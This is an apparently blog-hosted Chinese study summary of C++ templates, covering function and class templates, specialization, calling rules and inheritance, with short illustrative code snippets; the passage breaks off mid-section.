    <content><![CDATA[<h1 id="C-提高编程部分总结"><a href="#C-提高编程部分总结" class="headerlink" title="C++提高编程部分总结"></a>C++提高编程部分总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里是对于想要深入了解C++编程的同学的关于提高编程部分的总结，请在了解了核心部分和基础部分后再看本部分总结，不然有些地方很难懂</p>
<h2 id="1-模板"><a href="#1-模板" class="headerlink" title="1 模板"></a>1 模板</h2><h3 id="1-1-模板概念"><a href="#1-1-模板概念" class="headerlink" title="1.1 模板概念"></a>1.1 模板概念</h3><p><strong>概念：</strong>建立<strong>通用的模具</strong>，大大<strong>提高复用性</strong></p>
<p><strong>特点：</strong></p>
<ul>
<li>模板不可以直接使用，它只是一个框架</li>
<li>模板的通用并不是万能的</li>
</ul>
<p><strong>运用思想：泛型编程</strong></p>
<p><strong>模板机制：</strong></p>
<ul>
<li><strong>函数模板</strong></li>
<li><strong>类模板</strong></li>
</ul>
<p><strong>作用：</strong></p>
<p>建立一个通用函数，其函数返回值类型和形参类型可以不具体制定，用一个<strong>虚拟的类型</strong>来代表。</p>
<p><strong>语法：</strong> </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="comment">//函数声明或定义</span></span><br><span class="line"><span class="keyword">template</span>  ---  <span class="comment">//声明创建模板</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typename</span>  --- <span class="comment">//表面其后面的符号是一种数据类型，可以用class代替</span></span><br><span class="line"></span><br><span class="line">T    ---   <span class="comment">//通用的数据类型，名称可以替换，通常为大写字母</span></span><br></pre></td></tr></table></figure></div>



<p><strong>注意事项：</strong></p>
<ul>
<li><p>自动类型推导，必须推导出一致的数据类型T,才可以使用</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//利用模板提供通用的交换函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap</span><span class="params">(T&amp; a, T&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printArray</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1、自动类型推导</span></span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> b=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="comment">//这样不同的类型就不能用模板来实现</span></span><br><span class="line">	<span class="built_in">mySwap</span>(a, b);</span><br><span class="line">    <span class="built_in">printArray</span>(charArr, num);</span><br><span class="line">    <span class="built_in">printArray</span>(intArr, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</li>
<li><p>模板必须要确定出T的数据类型，才可以使用（但T为什么根据情况来，没有特殊要求可以任取）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//利用模板提供通用的交换函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&#x27;hhh&#x27;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//2、显示指定类型</span></span><br><span class="line">	<span class="built_in">func</span>();<span class="comment">//错误</span></span><br><span class="line">    <span class="built_in">func</span>&lt;<span class="type">int</span>&gt;();<span class="comment">//正确</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>局限性：</strong></p>
<ul>
<li>模板的通用性并不是万能的</li>
<li>简单赋值操作不能用于数组</li>
<li>普通数据类型不能用于类数据类型</li>
</ul>
<p><strong>拓展性（局限性的解决）：</strong>（用具体化的方式实现特殊情景）</p>
<ul>
<li><p>具体化（<code>template&lt;&gt;</code>）</p>
</li>
<li><p>其实也是另一种重载形式</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//具体化，显示具体化的原型和定意思以template&lt;&gt;开头，并通过名称来指出类型</span></span><br><span class="line"><span class="comment">//具体化优先于常规模板</span></span><br><span class="line"><span class="keyword">template</span>&lt;&gt; <span class="function"><span class="type">bool</span> <span class="title">myCompare</span><span class="params">(Person &amp;p1, Person &amp;p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( p<span class="number">1.</span>m_Name  == p<span class="number">2.</span>m_Name &amp;&amp; p<span class="number">1.</span>m_Age == p<span class="number">2.</span>m_Age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="1-2-函数模板"><a href="#1-2-函数模板" class="headerlink" title="1.2 函数模板"></a>1.2 函数模板</h3><p><strong>函数模板作用：</strong></p>
<p>建立一个通用函数，其函数返回值类型和形参类型可以不具体制定，用一个<strong>虚拟的类型</strong>来代表。</p>
<p><strong>语法：</strong> </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="comment">//函数声明或定义</span></span><br><span class="line"><span class="keyword">template</span>  ---  <span class="comment">//声明创建模板</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typename</span>  --- <span class="comment">//表面其后面的符号是一种数据类型，可以用class代替</span></span><br><span class="line"></span><br><span class="line">T    ---   <span class="comment">//通用的数据类型，名称可以替换，通常为大写字母</span></span><br></pre></td></tr></table></figure></div>

<h4 id="1-2-1-函数模板使用方法"><a href="#1-2-1-函数模板使用方法" class="headerlink" title="1.2.1 函数模板使用方法"></a>1.2.1 函数模板使用方法</h4><ul>
<li><p>自动类型推导（IDE自己判断）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//利用模板提供通用的交换函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap</span><span class="params">(T&amp; a, T&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1、自动类型推导</span></span><br><span class="line">	<span class="built_in">mySwap</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>显示指定类型（&lt;类型&gt;——自己传入类型）</p>
</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//利用模板提供通用的交换函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap</span><span class="params">(T&amp; a, T&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//2、显示指定类型</span></span><br><span class="line">	<span class="built_in">mySwap</span>&lt;<span class="type">int</span>&gt;(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="1-2-2-普通函数与函数模板"><a href="#1-2-2-普通函数与函数模板" class="headerlink" title="1.2.2 普通函数与函数模板"></a>1.2.2 普通函数与函数模板</h4>
  <div class="note p-4 mb-4 rounded-small info">
    <p>一般不同时出现，除非故意这么写，或不小心多写了</p>

  </div>

<p><strong>区别：</strong></p>
<ul>
<li>普通函数调用时可以发生自动类型转换（隐式类型转换）</li>
<li>函数模板调用时，如果利用自动类型推导，不会发生隐式类型转换</li>
<li>如果利用显示指定类型的方式，可以发生隐式类型转换</li>
</ul>
<blockquote>
<p>当传入为不同的类型参数时，模板函数不能推到，而普通函数可以（int与char，char会转为ascii码）</p>
</blockquote>
<p><strong>调用规则：</strong></p>
<ul>
<li><p>如果函数模板和普通函数都可以实现，<strong>优先调用普通函数</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//优先调用普通函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;调用的普通函数&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(T a, T b)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;调用的模板&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>可以通过空模板参数列表来强制调用函数模板</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//空模板参数列表</span></span><br><span class="line">myPrint&lt;&gt;(a, b); <span class="comment">//调用函数模板</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>函数模板也可以发生重载</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数模板重载</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(T a, T b)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;调用的模板&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(T a, T b, T c)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;调用重载的模板&quot;</span> &lt;&lt; endl; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果函数模板可以产生更好的匹配,优先调用函数模板</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//考虑更好的匹配机制，优先调用函数模板</span></span><br><span class="line"><span class="type">char</span> c1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> c2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="built_in">myPrint</span>(c1, c2); <span class="comment">//调用函数模板</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="1-3-类模板"><a href="#1-3-类模板" class="headerlink" title="1.3 类模板"></a>1.3 类模板</h3><p><strong>类模板作用：</strong></p>
<ul>
<li>建立一个通用类，类中的成员 数据类型可以不具体制定，用一个<strong>虚拟的类型</strong>来代表。</li>
</ul>
<p><strong>语法：</strong> </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="comment">//函数声明或定义</span></span><br><span class="line"><span class="keyword">template</span>  ---  <span class="comment">//声明创建模板</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typename</span>  --- <span class="comment">//表面其后面的符号是一种数据类型，可以用class代替</span></span><br><span class="line"></span><br><span class="line">T    ---   <span class="comment">//通用的数据类型，名称可以替换，通常为大写字母</span></span><br></pre></td></tr></table></figure></div>

<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类模板</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span>&gt; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(NameType name, AgeType age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mName = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mName &lt;&lt; <span class="string">&quot; age: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	NameType mName;</span><br><span class="line">	AgeType mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person&lt;string, <span class="type">int</span>&gt;<span class="built_in">P1</span>(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">999</span>);</span><br></pre></td></tr></table></figure></div>

<h4 id="1-3-2-成员函数"><a href="#1-3-2-成员函数" class="headerlink" title="1.3.2 成员函数"></a>1.3.2 成员函数</h4><h5 id="1-3-2-1-创建时机"><a href="#1-3-2-1-创建时机" class="headerlink" title="1.3.2.1 创建时机"></a>1.3.2.1 创建时机</h5><p><strong>类模板中的成员函数在调用时才创建</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person1 show&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person2 show&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	T obj;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//类模板中的成员函数，并不是一开始就创建的，而是在模板调用时再生成</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123; obj.<span class="built_in">showPerson1</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">fun2</span><span class="params">()</span> </span>&#123; obj.<span class="built_in">showPerson2</span>(); &#125;</span><br><span class="line">    <span class="comment">//无法直接调用这两个函数，需要在主函数中给定obj的类型，才会选择行的调用</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MyClass&lt;Person1&gt; m;<span class="comment">//能调用fun1()，不能调用fun2()</span></span><br></pre></td></tr></table></figure></div>

<h5 id="1-3-2-2-类外实现"><a href="#1-3-2-2-类外实现" class="headerlink" title="1.3.2.2 类外实现"></a>1.3.2.2 类外实现</h5><blockquote>
<p>类模板中成员函数在类内声明，在类外实现定义</p>
</blockquote>
<p><strong>注意事项：</strong>类模板中成员函数类外实现时，需要加上模板参数列表</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类模板中成员函数类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//成员函数类内声明</span></span><br><span class="line">	<span class="built_in">Person</span>(T1 name, T2 age);</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	T1 m_Name;</span><br><span class="line">	T2 m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数 类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line">Person&lt;T1, T2&gt;::<span class="built_in">Person</span>(T1 name, T2 age) &#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//成员函数 类外实现</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="type">void</span> Person&lt;T1, T2&gt;::<span class="built_in">showPerson</span>() &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="1-3-3-类模板对象做函数参数"><a href="#1-3-3-类模板对象做函数参数" class="headerlink" title="1.3.3 类模板对象做函数参数"></a>1.3.3 类模板对象做函数参数</h4><p>传入方式：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类模板</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span> = <span class="type">int</span>&gt; </span><br><span class="line"><span class="keyword">class</span> Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(NameType name, AgeType age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mName = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mName &lt;&lt; <span class="string">&quot; age: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	NameType mName;</span><br><span class="line">	AgeType mAge;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p><strong>指定传入的类型</strong>   — 直接显示对象的数据类型</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、指定传入的类型</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPerson1</span><span class="params">(Person&lt;string, <span class="type">int</span>&gt; &amp;p)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printPerson1</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>参数模板化           — 将对象中的参数变为模板进行传递</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2、参数模板化</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPerson2</span><span class="params">(Person&lt;T1, T2&gt;&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;T1的类型为： &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T1).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;T2的类型为： &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T2).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;猪八戒&quot;</span>, <span class="number">90</span>);</span><br><span class="line">	<span class="built_in">printPerson2</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>整个类模板化       — 将这个对象类型 模板化进行传递</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//3、整个类模板化</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPerson3</span><span class="params">(T &amp; p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;T的类型为： &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;唐僧&quot;</span>, <span class="number">30</span>);</span><br><span class="line">	<span class="built_in">printPerson3</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h4 id="1-3-4-模板中导出系统给模板定义的数据类型"><a href="#1-3-4-模板中导出系统给模板定义的数据类型" class="headerlink" title="1.3.4 模板中导出系统给模板定义的数据类型"></a>1.3.4 模板中导出系统给模板定义的数据类型</h4><p><strong>关键词：</strong><code>typeid</code></p>
<p><strong>语法：</strong><code>typeid(T).name()</code></p>
<h4 id="1-3-5-类模板与继承"><a href="#1-3-5-类模板与继承" class="headerlink" title="1.3.5 类模板与继承"></a>1.3.5 类模板与继承</h4><p><strong>注意事项：</strong></p>
<ul>
<li><p>当子类继承的父类是一个类模板时，子类在声明的时候，要指定出父类中T的类型</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line">	T m;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class Son:public Base  //错误，c++编译需要给子类分配内存，必须知道父类中T的类型才可以向下继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> :<span class="keyword">public</span> Base&lt;<span class="type">int</span>&gt; <span class="comment">//必须指定一个类型</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果不指定，编译器无法给子类分配内存</p>
</li>
<li><p>如果想灵活指定出父类中T的类型，子类也需变为类模板</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类模板继承类模板 ,可以用T2指定父类中的T类型</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span> :<span class="keyword">public</span> Base&lt;T2&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son2</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="built_in">typeid</span>(T1).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="built_in">typeid</span>(T2).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son2&lt;<span class="type">int</span>, <span class="type">char</span>&gt; child1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="1-3-6-类模板与函数模板区别"><a href="#1-3-6-类模板与函数模板区别" class="headerlink" title="1.3.6 类模板与函数模板区别"></a>1.3.6 类模板与函数模板区别</h4><p>类模板与函数模板区别主要有两点：</p>
<ul>
<li><p>类模板没有自动类型推导的使用方式（需要自己在定义类对象的时候加上&lt;&gt;）</p>
